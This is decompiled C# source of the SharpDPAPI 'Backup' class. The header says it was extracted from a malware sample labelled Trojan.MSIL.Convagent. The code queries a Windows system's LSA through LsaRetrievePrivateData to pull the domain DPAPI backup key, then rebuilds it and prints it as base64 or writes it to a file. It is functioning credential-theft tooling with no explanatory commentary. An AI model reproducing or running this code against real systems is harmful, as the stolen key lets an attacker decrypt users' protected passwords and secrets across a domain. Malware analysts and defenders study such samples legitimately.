// Decompiled with JetBrains decompiler
// Type: SharpDPAPI.Backup
// Assembly: SharpChrome, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D938FA4A-3611-4CA7-B3BE-AF9F6D845B7B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\VHO-Trojan.MSIL.Convagent.gen-340a639e1ec7cb2afa90a2aba177b368e13efc4dd1313e32af30b6ceb259f7d3.exe

using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;

namespace SharpDPAPI
{
  public class Backup
  {
    public static void GetBackupKey(string system, string outFile = "")
    {
      Interop.LSA_UNICODE_STRING SystemName = new Interop.LSA_UNICODE_STRING(system);
      IntPtr PolicyHandle = IntPtr.Zero;
      uint winError1 = Interop.LsaNtStatusToWinError(Interop.LsaOpenPolicy(ref SystemName, ref new Interop.LSA_OBJECT_ATTRIBUTES()
      {
        Length = 0U,
        RootDirectory = IntPtr.Zero,
        Attributes = 0U,
        SecurityDescriptor = IntPtr.Zero,
        SecurityQualityOfService = IntPtr.Zero
      }, 4U, out PolicyHandle));
      if (winError1 == 0U)
      {
        IntPtr PrivateData1 = IntPtr.Zero;
        Interop.LSA_UNICODE_STRING KeyName1 = new Interop.LSA_UNICODE_STRING("G$BCKUPKEY_PREFERRED");
        uint status1 = Interop.LsaRetrievePrivateData(PolicyHandle, ref KeyName1, out PrivateData1);
        if (status1 != 0U)
        {
          uint winError2 = Interop.LsaNtStatusToWinError(status1);
          string message = new Win32Exception((int) winError2).Message;
          Console.WriteLine("  [X] Error calling LsaRetrievePrivateData {0} : {1}", (object) winError2, (object) message);
        }
        else
        {
          Interop.LSA_UNICODE_STRING structure1 = (Interop.LSA_UNICODE_STRING) Marshal.PtrToStructure(PrivateData1, typeof (Interop.LSA_UNICODE_STRING));
          byte[] numArray1 = new byte[(int) structure1.Length];
          Marshal.Copy(structure1.buffer, numArray1, 0, (int) structure1.Length);
          Guid guid = new Guid(numArray1);
          Console.WriteLine("[*] Preferred backupkey Guid         : {0}", (object) guid.ToString());
          string s = string.Format("G$BCKUPKEY_{0}", (object) guid.ToString());
          Console.WriteLine("[*] Full preferred backupKeyName     : {0}", (object) s);
          Interop.LSA_UNICODE_STRING KeyName2 = new Interop.LSA_UNICODE_STRING(s);
          IntPtr PrivateData2 = IntPtr.Zero;
          uint status2 = Interop.LsaRetrievePrivateData(PolicyHandle, ref KeyName2, out PrivateData2);
          if (status2 != 0U)
          {
            uint winError3 = Interop.LsaNtStatusToWinError(status2);
            string message = new Win32Exception((int) winError3).Message;
            Console.WriteLine("\r\n[X] Error calling LsaRetrievePrivateData ({0}) : {1}\r\n", (object) winError3, (object) message);
          }
          else
          {
            Interop.LSA_UNICODE_STRING structure2 = (Interop.LSA_UNICODE_STRING) Marshal.PtrToStructure(PrivateData2, typeof (Interop.LSA_UNICODE_STRING));
            byte[] numArray2 = new byte[(int) structure2.Length];
            Marshal.Copy(structure2.buffer, numArray2, 0, (int) structure2.Length);
            byte[] destinationArray1 = new byte[4];
            Array.Copy((Array) numArray2, 0, (Array) destinationArray1, 0, 4);
            BitConverter.ToInt32(destinationArray1, 0);
            byte[] destinationArray2 = new byte[4];
            Array.Copy((Array) numArray2, 4, (Array) destinationArray2, 0, 4);
            int int32 = BitConverter.ToInt32(destinationArray2, 0);
            byte[] destinationArray3 = new byte[4];
            Array.Copy((Array) numArray2, 8, (Array) destinationArray3, 0, 4);
            BitConverter.ToInt32(destinationArray3, 0);
            byte[] numArray3 = new byte[int32 + 24];
            Array.Copy((Array) numArray2, 12, (Array) numArray3, 24, int32);
            numArray3[0] = (byte) 30;
            numArray3[1] = (byte) 241;
            numArray3[2] = (byte) 181;
            numArray3[3] = (byte) 176;
            numArray3[8] = (byte) 1;
            Array.Copy((Array) BitConverter.GetBytes((uint) int32), 0, (Array) numArray3, 20, 4);
            if (string.IsNullOrEmpty(outFile))
            {
              string base64String = Convert.ToBase64String(numArray3);
              Console.WriteLine("[*] Key :");
              foreach (object obj in Helpers.Split(base64String, 80))
                Console.WriteLine("          {0}", obj);
            }
            else
            {
              FileStream output = File.Create(outFile);
              BinaryWriter binaryWriter = new BinaryWriter((Stream) output);
              binaryWriter.Write(numArray3);
              binaryWriter.Close();
              output.Close();
              Console.WriteLine("[*] Backup key written to            : {0}", (object) outFile);
            }
            int num1 = (int) Interop.LsaFreeMemory(PrivateData1);
            int num2 = (int) Interop.LsaClose(PolicyHandle);
          }
        }
      }
      else
      {
        string message = new Win32Exception((int) winError1).Message;
        Console.WriteLine("\r\n[X] Error calling LsaOpenPolicy ({0}) : {1}\r\n", (object) winError1, (object) message);
      }
    }
  }
}
